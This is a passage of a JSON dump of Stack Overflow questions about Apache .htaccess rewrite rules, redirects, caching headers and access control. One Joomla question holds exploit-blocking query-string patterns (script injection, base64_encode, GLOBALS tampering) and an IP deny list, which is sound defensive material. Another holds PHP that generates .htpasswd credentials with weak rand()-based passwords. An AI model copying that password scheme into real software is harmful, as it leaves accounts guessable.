/&gt;\nOptions -ExecCGI FollowSymLinks -Includes -IncludesNOEXEC -Indexes -MultiViews -SymLinksIfOwnerMatch\nAllowOverride All\n&lt;/Directory&gt;\n</code></pre>\n\n<p>Really what can I do next?</p>\n"},{"tags":[".htaccess","url","mod-rewrite","url-rewriting","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12926641,"title":"rewrite file to subdomain","body":"<p>We used this rules</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^mydomain\\.com [NC]\nRewriteCond %{QUERY_STRING} ^n=(.+)$\nRewriteRule ^news\\.php$ http://news.mydomain.cop/news.php?n=%1 [L,R=301]\n</code></pre>\n\n<p>for redirect </p>\n\n<ul>\n<li><p><code>http://mydomain.com/news.php?n=100</code> </p>\n\n<p>to </p></li>\n<li><p><code>http://news.mydomain.com/news.php?n=100</code></p></li>\n</ul>\n\n<p>but we need</p>\n\n<ul>\n<li><p><code>http://mydomain.com/news.php?n=100</code></p>\n\n<p>and </p></li>\n<li><p><code>http://news.mydomain.com/news.php?n=100</code> </p></li>\n</ul>\n\n<p>redirect 301 to </p>\n\n<ul>\n<li><code>http://news.mydomain.com/100.html</code></li>\n</ul>\n"},{"tags":["wordpress",".htaccess","http","redirect","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":12940424,"title":"Redirect a specific page from http to https in wordpress .htaccess","body":"<p>I need to redirect only one page in my wordpress site from http to https. I searched online but none of the solutions seem to work. This is the code I have in my .htaccess file:</p>\n\n<pre><code># Redirect to force SSL on test page\nRewriteCond %{HTTPS} off\nRewriteRule ^test/$ https://www.example.com/test/ [R=301,L]\n</code></pre>\n\n<p>Any suggestions would be greatly appreciated.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12939369,"title":".htaccess redirect and make pretty url","body":"<p>I am very new to .htaccess just want to write one rule which is something like this:</p>\n\n<p><code>http://www.example.com/profile.php?username=John.janorkar</code></p>\n\n<p>Want to make it something like this:</p>\n\n<p><code>http://www.example.com/profile/John.janorkar</code></p>\n\n<p>I also want to redirect without www to www as below (below code is working fine just have problem with above one.</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^example\\.com$ [NC] \nRewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]\n</code></pre>\n\n<p>Can any expert help me please?</p>\n"},{"tags":[".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12934666,"title":"Redirect URLs with br tag in htaccess","body":"<p>Sometimes a br tag is inserted into our urls when they're automatically linked from other websites. It triggers a 404 page. I want to remove that tag. For example, it looks like this:</p>\n\n<pre><code>http://www.healthyeatingstartshere.com/moti&lt;br /&gt;vation/healthy-eating-routine\n</code></pre>\n\n<p>This is what I have so far to fix it, but no dice:</p>\n\n<pre><code>RewriteRule ^(.*)&lt;br%20/&gt;(.*)$ http://www.healthyeatingstartshere.com/$1$2 [L,R=301]\n</code></pre>\n\n<p>Any thoughts?</p>\n\n<p>Thanks very much, Phil</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12939132,"title":"Circular htaccess rewrite rules","body":"<p>This seems like exactly what you would want to do with the htaccess rewrite rules. But I can't seem to get it to work properly.</p>\n\n<p>I have this page on my site: <a href=\"http://wireie.gocactus.com/network_extensions.php\" rel=\"nofollow\">http://wireie.gocactus.com/network_extensions.php</a></p>\n\n<p>I want to rename it to: <a href=\"http://wireie.gocactus.com/transparent-ethernet-solutions\" rel=\"nofollow\">http://wireie.gocactus.com/transparent-ethernet-solutions</a></p>\n\n<p>So this is the line I put in my htaccess file:</p>\n\n<pre><code>RewriteRule ^transparent-ethernet-solutions network_extensions\\.php [NC]\n</code></pre>\n\n<p>Alrighty. Now if I go to <code>/transparent-ethernet-solutions</code>, it works great.</p>\n\n<p>The problem is that, <code>/network_extensions.php</code> also still works great. So I'll want to rewrite that url with this line:</p>\n\n<pre><code>RewriteRule ^network_extensions\\.php*$ /transparent-ethernet-solutions [R,NC]\n</code></pre>\n\n<p>Now it gives me an error message about too many redirects. If I add the second line without the first line, it changes the URL on the PHP link but gives me a 'page not found' error on the pretty link redirection.</p>\n\n<p>My mind is blown. Can I have the URL rewritten without forwarding and have the new URL work without redirecting from the old one? I'm not sure if there's just some parameter I'm missing in the first line, or some combination of rules necessary.</p>\n"},{"tags":[".htaccess","http-headers","http-status-code-500","cache-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12918904,"title":".htaccess Cache-Control Headers Causing 500 Server Error","body":"<p>I'm trying to learn how to use .htaccess to manipulate my headers and, in Google's words, \"leverage browser caching\" to improve pageload times. The code I've experimented with is this:</p>\n\n<pre><code>&lt;FilesMatch \"\\.(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)$\"&gt;\nHeader set Cache-Control \"max-age=2592000, public\"\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.(js|css)$\"&gt;\nHeader set Cache-Control \"max-age=604800, public\"\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.(html|php)$\"&gt;\nHeader set Cache-Control \"max-age=14400, public\"\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>For some reason, this is causing the entire website to throw a 500 error. In case it makes any difference, I've inserted this code very early in the .htaccess file, before some authentication logic that requires a password for certain subdomains and a long list of 301 RewriteEngine redirects, because this website was recently reorganized and a lot of URLs have changed.</p>\n\n<p>Do you know why this is causing an error? I more or less copied the code from a blog and edited it to suit my needs. The 500 error also doesn't crop up immediately after I update the .htaccess file, which to me implies that the error is starting AFTER the Apache server's default four-hour cache expiry header lapses.</p>\n\n<p>EDIT 10-17-2012:</p>\n\n<p>Having tried adding and removing this code a couple of times now, I've confirmed that the headers DO WORK, albeit briefly. Using FireBug with PageSpeed, I can see that the max-age settings are being correctly applied to the files. Then after a while, as I've mentioned before, the website CHANGES to all 500, all the time.</p>\n\n<p>Another thing worthy of note: I'm actually trying to test the new headers on a password protected test subdomain before rolling it out to the main site. As far as I can tell it looks like for some reason, after updating the .htaccess on the SUBDOMAIN (which even runs out of its own folder, separate from /public_html/), the MAIN (www) site breaks.</p>\n\n<p>It's possible that I'm doing something wrong, or accidentally uploading to the main site when I think I'm updating the test subdomain, but I'm becoming hesitant to risk more downtime on the main site over this.</p>\n"},{"tags":["file",".htaccess","webserver"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12646478,"title":"How to restrict access to a file or files using .htaccess?","body":"<p>I want to restrict access to a file or files using .htaccess file. Basically, no one should be able to download file(s) using direct link to the file. However, the file should be accessible from my website.</p>\n\n<p>For instance, say I have a file called Presentation.ppt. I want the visitor to have access to it through my website, but if they try to download it or access it using direct link then the server should reject the request.</p>\n\n<p>Is it possible to do that using .htaccess?</p>\n\n<p>Thank you in advance,</p>\n"},{"tags":["apache",".htaccess","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12933109,"title":"Apache throwing 403 on www.example.com/dir/.php","body":"<p>I've discovered from Google Webmaster Tools that Google has found a bad link somewhere that is throwing a 403 error on my server.</p>\n\n<p>The url is like this:</p>\n\n<p><a href=\"http://www.example.com/directory/.php\" rel=\"nofollow\">http://www.example.com/directory/.php</a></p>\n\n<p>I don't know how that url has come about and the site is too complicated for me to find out, but I'd like to simply place a 301 redirect to:</p>\n\n<p><a href=\"http://www.example.com/directory/\" rel=\"nofollow\">http://www.example.com/directory/</a></p>\n\n<p>I've put the correct rule in .htaccess for the redirect, but it doesn't appear to be triggered. It's almost as if the 403 is being generated before .htaccess is processed. Does anyone know why this might be and how I can successfully get the user redirected to the new page?</p>\n"},{"tags":["php","html",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12935718,"title":"htaccess renaming .php files to .html files giving file not found errors?","body":"<p>I'm using this code to rewrite my php files to be html files, so <strong>technical.php</strong> would appear as <strong>technical.html</strong></p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)\\.html$ $1.php [nc]\n</code></pre>\n\n<p>but it gives me a 404 error when visiting technical.html</p>\n\n<pre><code>Not Found\n\nThe requested URL /technical.php was not found on this server.\n\nAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.\n</code></pre>\n\n<p>Did I get the order wrong in my htaccess?</p>\n"},{"tags":["php",".htaccess","http-status-code-500"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12911486,"title":"htaccess creation through php","body":"<p>Before anything, I except the kind of answers \"This is a BIGGGGG security issue\", no problem with that however I would like a detailled answer of the risks please.</p>\n\n<p>Here is my problem:\nI am using php to automatically secure some folders, without having to edit the files inside. It then goes by .htaccess. The thing is that the .htaccess and .htpasswd files are created, with the good access rights (and so on for the folders) however it always returns a 500 internal error and when I check the error log there is nothing specifically written about the error. If I create the files manually, it works.</p>\n\n<p>Here is the php code:</p>\n\n<pre><code>$htpath = '../../.htpasswds/'.$ref;\nmkdir($htpath, 0750);               \n$htpass = $htpath.'/.htpasswd';\n$ourFileHandle = fopen($htpass, 'wb') or die(\"Can't create .htpasswd file.\");\n$chars = \"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789\";\n$special_chars = '-_@#)([]|-=';\n$pass = $chars[rand(0,strlen($chars)-1)].$special_chars[rand(0,strlen($special_chars)-1)].$chars[rand(0,strlen($chars)-1)].rand(0, 9999).$chars[rand(0,strlen($chars)-1)].$special_chars[rand(0,strlen($special_chars)-1)];\n$content = 'client_access'.$id.':'.crypt($pass, base64_encode($pass));\nfwrite($ourFileHandle, $content) or die(\"Can't create .htaccess file.\");                \nfclose($ourFileHandle);\n\n$htpass = $path.'/.htaccess';\n$handle = fopen($htpass, 'wb') or die(\"Can't create .htpasswd file.\");\n$content = 'AuthType \"Basic\" ';\n$content .= \"\\n\";\nfwrite($handle, $content);              \n$content = 'AuthUserFile \"/home/thedigi1/.htpasswds/'.$ref.'/.htpasswd\" ';\n$content .= \"\\n\";               \nfwrite($handle, $content);\n$content = 'Require valid-user ';\n$content .= \"\\n\";               \nfwrite($handle, $content);\n$content = 'RewriteOptions inherit';\n$content .= \"\\n\";               \nfwrite($handle, $content) or die(\"Can't create .htaccess file.\");\nfclose($handle);\n</code></pre>\n\n<p>Do you have any idea of what may cause the problem? Or maybe a better solution please?</p>\n\n<p>Thanks a lot!</p>\n\n<p>Edit:\nhere is the code of the htaccess created:</p>\n\n<pre><code>AuthType \"Basic\" \nAuthUserFile \"/home/thedigi1/.htpasswds/A-161012-47/.htpasswd\" \nRequire valid-user \nRewriteOptions inherit\n</code></pre>\n\n<p>However I am already authentified through a htaccess to access to the php file which creates the htaccess, do you think it could be the problem?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12936194,"title":"My .htaccess code don't work on my server, htaccess of wordpress works","body":"<p>I already asked something about mod rewrite. The rule know works on most of the servers. But not on my self installed server. Here is the .htaccess code:</p>\n\n<pre><code>RewriteEngine On \nRewriteBase / \n\n\nRewriteCond %{REQUEST_FILENAME} -f [NC,OR] \nRewriteCond %{REQUEST_FILENAME} -d [NC] \nRewriteRule ^(.*?)$ $1 [L] \n\n\nRewriteRule ^(.*)/(.*)/(.*)$ index.php?view=$1&amp;id=$2&amp;name=$3 \n</code></pre>\n\n<p>If I use wordpress and activate permalinks they work.</p>\n\n<p>I hope someone can help me.</p>\n\n<p>Thanks.</p>\n\n<p>Problem solved: I need to use this code:</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{REQUEST_FILENAME} -f [NC,OR] \nRewriteRule ^(.*)/(.*)/(.*)$ index.php?view=$1&amp;id=$2&amp;name=$3\n</code></pre>\n"},{"tags":["php",".htaccess","joomla","linker-error"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12932739,"title":"Joomla - 404 error on accessing www.domain.com/administrator","body":"<p>I'm using joomla,</p>\n\n<blockquote>\n  <p>i have <strong>moved my website</strong> from old server to new server because of that, i\n  can't access my BACK-END{ administrator/}</p>\n</blockquote>\n\n<p>ERROR : 404 - Component not found\n<img src=\"http://i.stack.imgur.com/tFTMK.png\" alt=\"enter image description here\"></p>\n\n<p><em>, but i can able to access my <strong>FRONT-END</strong>.</em></p>\n\n<p>I just gone so for,</p>\n\n<p><strong>1. I have placed Die() at very first line of administrator/index.php but no use same error is Throwing.</strong></p>\n\n<p><strong>2.I created temp.html on administartor root, i can able to access temp.html</strong>{HAPPY- lol}.</p>\n\n<p>can any one tell your suggestion.....\ni gone 1 day for trying to get a solution. </p>\n\n<p>can any one help me... PLSSSSS</p>\n\n<p>.htaccess File,</p>\n\n<pre><code>RewriteEngine on\n##\n# @version $Id: htaccess.txt 13415 2009-11-03 15:53:25Z ian $\n# @package Joomla\n# @copyright Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.\n# @license http://www.gnu.org/copyleft/gpl.html GNU/GPL\n# Joomla! is Free Software\n##\n\n#####################################################\n#  READ THIS COMPLETELY IF YOU CHOOSE TO USE THIS FILE\n#\n# The line just below this section: 'Options +FollowSymLinks' may cause problems\n# with some server configurations.  It is required for use of mod_rewrite, but may already\n# be set by your server administrator in a way that dissallows changing it in\n# your .htaccess file.  If using it causes your server to error out, comment it out (add # to\n# beginning of line), reload your site in your browser and test your sef url's.  If they work,\n# it has been set by your server administrator and you do not need it set here.\n#\n#####################################################\n\n##  Can be commented out if causes errors, see notes above.\nOptions +FollowSymLinks\n\n#\n#  mod_rewrite in use\n\nRewriteCond %{HTTP_HOST} ^domain.com [NC] \nRewriteRule ^(.*)$ http://www.domain.com/$1 [L,R=301]\n\n########## Begin - Rewrite rules to block out some common exploits\n## If you experience problems on your site block out the operations listed below\n## This attempts to block the most common type of exploit `attempts` to Joomla!\n#\n## Deny access to extension xml files (uncomment out to activate)\n#&lt;Files ~ \"\\.xml$\"&gt;\n#Order allow,deny\n#Deny from all\n#Satisfy all\n#&lt;/Files&gt;\n## End of deny access to extension xml files\nRewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\\%3D) [OR]\n# Block out any script trying to base64_encode crap to send via URL\nRewriteCond %{QUERY_STRING} base64_encode.*\\(.*\\) [OR]\n# Block out any script that includes a &lt;script&gt; tag in URL\nRewriteCond %{QUERY_STRING} (\\&lt;|%3C).*script.*(\\&gt;|%3E) [NC,OR]\n# Block out any script trying to set a PHP GLOBALS variable via URL\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\n# Block out any script trying to modify a _REQUEST variable via URL\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\n# Send all blocked request to homepage with 403 Forbidden error!\nRewriteRule ^(.*)$ index.php [F,L]\n#\n########## End - Rewrite rules to block out some common exploits\n\n#  Uncomment following line if your webserver's URL\n#  is not directly related to physical file paths.\n#  Update Your Joomla! Directory (just / for root)\n\n# RewriteBase /\n\n########## Begin - Joomla! core SEF Section\n#\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteRule ^index\\.php$ http://www.domain.com/ [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\nRedirect 301 /home.html http://www.domain.com/\n\n#\n########## End - Joomla! core SEF Section\n&lt;Files 403.shtml&gt;\norder allow,deny\nallow from all\n&lt;/Files&gt;\n\ndeny from 174.142.29.222\ndeny from 124.125.148.138\ndeny from 74.86.112.146\ndeny from 77.28.165.151\ndeny from 202.89.110.162\n\n\ndeny from 195.72.157.198\ndeny from 195.72.158.243\ndeny from 195.72.157.152\ndeny from 195.72.157.\ndeny from 95.143.192.112\ndeny from 195.2.128.155\ndeny from 184.154.162.98\ndeny from 93.187.234.108\ndeny from 94.23.217.1/32\ndeny from 94.23.217.2/31\ndeny from 94.23.217.4/30\ndeny from 94.23.217.8/29\ndeny from 94.23.217.16/28\ndeny from 94.23.217.32/27\ndeny from 94.23.217.64/27\ndeny from 94.23.217.96/30\ndeny from 193.23.143.100/30\ndeny from 193.23.143.104/29\ndeny from 193.23.143.112/28\ndeny from 193.23.143.128/25\ndeny from 204.93.163.22\ndeny from 187.5.52.165\ndeny from 66.197.227.185\ndeny from 174.123.114.18\ndeny from 195.20.225.4\ndeny from 93.95.224.183\ndeny from 75.75.239.2\ndeny from 74.220.215.90\ndeny from 186.212.16.152\ndeny from 189.75.128.147\ndeny from 93.95.103.84\ndeny from 66.96.128.62\ndeny from 69.93.122.89\ndeny from 93.115.119.68\ndeny from 67.225.136.100/30\ndeny from 67.225.136.104/29\ndeny from 67.225.136.112/28\ndeny from 67.225.136.128/25\ndeny from 184.164.130.67\ndeny from 69.163.178.136\ndeny from 200.58.122.14\ndeny from 74.220.207.112\ndeny from 190.228.29.70\ndeny from 213.162.209.199\ndeny from 82.159.141.9\ndeny from 146.0.74.28\ndeny from 146.0.79.23\n</code></pre>\n"},{"tags":["apache",".htaccess","header","mod-expires"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":183,"score":1,"question_id":12882081,"title":"header expire on javascript files not working","body":"<p>I can't get the expire header on JS files to work properly.. It works fine on eg CSS files!?</p>\n\n<p>Could anybody tell me what Im doing wrong? :(</p>\n\n<h1>htaccess</h1>\n\n<pre><code>ExpiresActive on\nExpiresDefault A0\nExpiresByType image/gif A29030400\nExpiresByType image/jpeg A29030400\nExpiresByType image/png A29030400\nExpiresByType text/css A29030400\nExpiresByType text/javascript A29030400\nExpiresByType application/x-javascript A29030400\n</code></pre>\n\n<h1>header on CSS file</h1>\n\n<pre><code>Cache-Control   max-age=29030400\nConnection  Keep-Alive\nDate    Sun, 14 Oct 2012 12:06:45 GMT\nEtag    \"be-4cbcf2ad48b40\"\nExpires Sun, 15 Sep 2013 12:06:45 GMT\nKeep-Alive  timeout=5, max=97\nServer  Apache/2.4.2 (Win64) PHP/5.4.3\n</code></pre>\n\n<h1>header on JS file</h1>\n\n<pre><code>Cache-Control   max-age=0\nConnection  Keep-Alive\nDate    Sun, 14 Oct 2012 12:06:45 GMT\nEtag    \"1ad-4cc00d069f493\"\nExpires Sun, 14 Oct 2012 12:06:45 GMT\nKeep-Alive  timeout=5, max=99\nServer  Apache/2.4.2 (Win64) PHP/5.4.3\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12935661,"title":".htaccess mod_rewrite, probably very simple","body":"<p>I am trying to take my link domain.com/view.php?id=12345 and my it to be domain.com/view/12345</p>\n\n<p>I'm unsure on to have I need to do, or what so here are my questions:</p>\n\n<ol>\n<li>Do I need to make a view folder and put a file in there?</li>\n<li>How would I make the rewrite rule?</li>\n<li>How can I make it redirect to the new link?</li>\n<li>What would I link my pages as?</li>\n</ol>\n\n<p>Here is my current rewrite rule. I know it's using the file because I did a test earlier from anther questions I found.</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^view/([0-9]+)/$ view.php?id=$1\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":6,"view_count":84,"score":-3,"question_id":12933739,"title":"How to use directories as variables in a subdomain url?","body":"<p>I have a structure like sub.domain.com and i'd like to pass variables by using the url with htaccess, so the final structure would be:</p>\n\n<pre><code>sub.domain.com/info/\n</code></pre>\n\n<p>and i get:</p>\n\n<pre><code>sub.domain.com/?cl=info\n</code></pre>\n\n<p>Can anyone please help me? I'm not good with htaccess rules!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12925567,"title":"Apache - rewrite images to php file with .htaccess","body":"<p>I'm looking for a way to rewrite all my image requests from one <strong>folder</strong> into <strong>some.php</strong> file, while preserving the original image url (or partial path).</p>\n\n<p>So, </p>\n\n<pre><code>example.com/folder/img/test.jpg\n</code></pre>\n\n<p>would be rewrited as something like</p>\n\n<pre><code>example.com/folder/some.php?img=img/test.jpg\n</code></pre>\n\n<p>(is this the best approach?)</p>\n\n<p>I'm not familiarized enought witrh regular expressions, so I'll be very thankfull :)</p>\n\n<p><strong>note :</strong> I've tried some solutions before, none of them worked. ALso, I'm running <strong>Apache 2.0</strong> under <strong>CentOS</strong> environment.</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":61,"score":-1,"question_id":12932002,"title":"How to do URL rewriting of static page?","body":"<p>I'm new to URlRewriting and I've been having some problems rewriting my URLs. I done rewriting for dynamic urls \nlike</p>\n\n<pre><code>www.mysite.com/page.php?id=4\n</code></pre>\n\n<p>to</p>\n\n<pre><code>www.mysite.com/4\n</code></pre>\n\n<p>But I have problem in static page url rewriting ..</p>\n\n<pre><code>www.mysite.com/page.php\n</code></pre>\n\n<p>to</p>\n\n<pre><code>www.mysite.com/page\n</code></pre>\n\n<p>I google alot but not find sutable answer..  Please help me.....</p>\n\n<p>I am using these patterns </p>\n\n<pre><code>RewriteRule ^flight-bookings /flight-bookings.php [L]\nRewriteRule ^flight-bookings$ /flight-bookings.php [L]\n RewriteRule ^flight-bookings flight-bookings.php [L]\n</code></pre>\n\n<p>But no one work I always got 404 page not found.. while </p>\n\n<pre><code>www.mysite.com/flight-bookings.php\n</code></pre>\n\n<p>working perfectly</p>\n"},{"tags":["linux","apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12929222,"title":"Redirect 301 /subfolder/old-page-name.html http://domain.com/new-page-name.html Not Working","body":"<p>I'm a complete novice but don't see what I'm doing wrong with what would appear to be very simple page by page redirects for pages that have changed names but have identical content.</p>\n\n<p>This is the .htaccess file with just one of the page redirects below the canonical redirect:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\n\nRewriteCond %{http_host} ^clarityperformancealliance.com [nc]\nRewriteRule ^(.*)$ http://www.clarityperformancealliance.com/$1 [r=301,nc]\n\nRedirect 301 /clarity/[A].html http://www.clarityperformancealliance.com/current-performance.html\n</code></pre>\n\n<p>I realize that the old page is a <em>very</em> poorly named page (using brackets) but I don't think the brackets are why it's failing because I've tried to redirect pages that have more normal names without brackets and they fail as well.</p>\n\n<p>I'm on a shared Network Solutions Linux server using what I assume is an Apache server.  They have their shared servers set up in what I assume is pretty typical fashion in that my root folder is called htdocs and I can create as many subfolders and websites within them as I want to, thus I have a subfolder named \"clarity\" for this particular website.</p>\n\n<p>The non-www to www redirect works perfectly.  It's all the individual page redirects (only one shown here) that aren't working.</p>\n\n<p>What am I missing?</p>\n"},{"tags":["php",".htaccess","payment-gateway"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12933021,"title":"URL Rewriting rule is preventing the response which is comming from payment gateway?","body":"<p>I have integrated payment gateway and it is giving an array as response. I wrote bellow line for URL re-wrinting in my .htaccess file</p>\n\n<pre><code>  RewriteCond %{HTTPS} !=on\n  RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n  RewriteRule ^ http://%1%{REQUEST_URI} [R=301,L]\n</code></pre>\n\n<p>Due to these lines, payment gateway response is coming in unreadable data(This is not encrypted data). If i am removing thease lines i am getting the payment gateway response in array format. </p>\n\n<p>How to solve this issue. Why rewriting rule are effecting the payment gateway response.</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12931664,"title":"htaccess image url rewrite.. getting rid of country code","body":"<p>In my oscommerce setup image urls in the secondary language generates with a country code after the file name..\nLike: <a href=\"http://www.page.com/images/IMG_5739big.jpg/cs\" rel=\"nofollow\">http://www.page.com/images/IMG_5739big.jpg/cs</a> is it possible to make a rule that takes away /cs ?\nso it becomes: <a href=\"http://www.page.com/images/IMG_5739big.jpg\" rel=\"nofollow\">http://www.page.com/images/IMG_5739big.jpg</a></p>\n\n<p>Or anything ending with .jpg/cs rewritten to .jpg</p>\n"},{"tags":[".htaccess","url-rewriting","file-extension"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":34,"score":1,"question_id":12931012,"title":"How to hide file extension in website?","body":"<p>I want to hide the file extension on my website.<br>\nThis is the content of my <code>.htaccess</code>:</p>\n\n<pre><code># Do not remove this line, otherwise mod_rewrite rules will stop working\nRewriteBase /\n\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^([^/]+)/$ $1.html\n</code></pre>\n\n<p>For example:</p>\n\n<p><code>http://example.com/website2</code> will map to <code>http://example.com/website2.html</code></p>\n"},{"tags":["apache",".htaccess","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12930511,"title":"Apache Alias and .htacces at Zend project is not working","body":"<p>I made zend project and it had work correctly with out any problem. I created new virtual host with alias as follows. </p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n   DocumentRoot \"/home/dinuka/workspace/peye_backend/public\"\n   ServerName peye.test.com\n\n   &lt;Directory \"/home/dinuka/workspace/peye_backend/public\"&gt;\n       Options Indexes MultiViews FollowSymLinks\n       AllowOverride All\n       Order allow,deny\n       Allow from all\n   &lt;/Directory&gt;\n\n   Alias /new /home/dinuka/workspace/peye_backend_new/public\n   &lt;Directory \"/home/dinuka/workspace/peye_backend_new/public\"&gt;\n       Options Indexes MultiViews FollowSymLinks\n       AllowOverride All\n       Order allow,deny\n       Allow from all\n   &lt;/Directory&gt;\n\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>My .htaccess at /home/dinuka/workspace/peye_backend_new/public is </p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ /new/index.php [NC,L]\n</code></pre>\n\n<p>Now <code>peye.test.com</code> and <code>peye.test.com/new</code> url is working and they redirect to different sites. But some time it redirect to  <code>peye.test.com/new/new</code> </p>\n\n<p>I debug the from controller and find it is redirect from <code>Zend_Db_Table_Abstract</code> class. </p>\n\n<pre><code>class Eme_Peye_Models_DbTable_Directorytypes extends Zend_Db_Table_Abstract\n{\n    protected $_name = 'dir_types';\n    protected $_sequence = 'dir_types_dir_type_id_seq';\n\n    public function getAllDirectorytypes($order = 'dir_type_name')\n    {\n        //die('Now works')\n        $select = $this-&gt;select()\n                        -&gt;from($this, array('key'=&gt;'dir_type_id', 'value'=&gt;'dir_type_name'))\n                        -&gt;order($order);\n        //die('Not working')    \n\n        return  $this-&gt;fetchAll($select)-&gt;toArray();\n    }\n\n}\n</code></pre>\n\n<p>I can't describe this problem another way. Please help me. I think that problem from apache. </p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12930997,"title":".htaccess causes 404 error","body":"<p>Morning Stackers,</p>\n\n<p>I've recently inherited a website, I've moved the entire website over to the new server and tweaked the DB &amp; Config URLs to point to the new location.</p>\n\n<p>I think its the .htaccess as when I play around with it the index page works but none of the other pages do, Here is the current .htacess script (below) and here is the website Temp URL LINK-->http://83.170.113.94/~gagajool/ any suggestions on how to fix this problem would be great to hear.</p>\n\n<p>Thank you</p>\n\n<pre><code> RewriteEngine on\n    Options FollowSymLinks\n\n    RewriteCond %{REQUEST_URI} ^$\n    RewriteRule ^(.+)$ / [R=301,L]\n\n    RewriteCond %{REQUEST_URI} !^/static\n    RewriteCond %{REQUEST_URI} !^/index.php\n    RewriteCond %{REQUEST_URI} !^/favicon.ico\n\n    RewriteRule ^(.+[^/])$ /$1/ [R=301,L]\n\n    RewriteCond %{REQUEST_URI} !^/static\n    RewriteCond %{REQUEST_URI} !^/index.php\n    RewriteCond %{REQUEST_URI} !^/favicon.ico\n\n    RewriteRule ^(.+)$ /index.php?request=$1 [QSA,L]\n</code></pre>\n"},{"tags":["regex",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12926604,"title":"inverted FilesMatch?","body":"<p>I'm setting cache control headers for files. I want to set <code>max-age=86400</code> for all <code>.css</code> and <code>.js</code>, and <code>max-age=3600</code> for all others.</p>\n\n<pre><code>&lt;FilesMatch \"\\.(css|js)$\"&gt;\n    Header append Cache-Control max-age=86400\n&lt;/FilesMatch&gt;\n\n&lt;FilesMatch \"???\"&gt;\n    Header append Cache-Control max-age=3600\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>I can't figure out what regex I should write to invert <code>\\.(css|js)$</code> match. Or maybe there is some other way to do this?</p>\n\n<p><strong>UPDATE</strong>. Based on <a 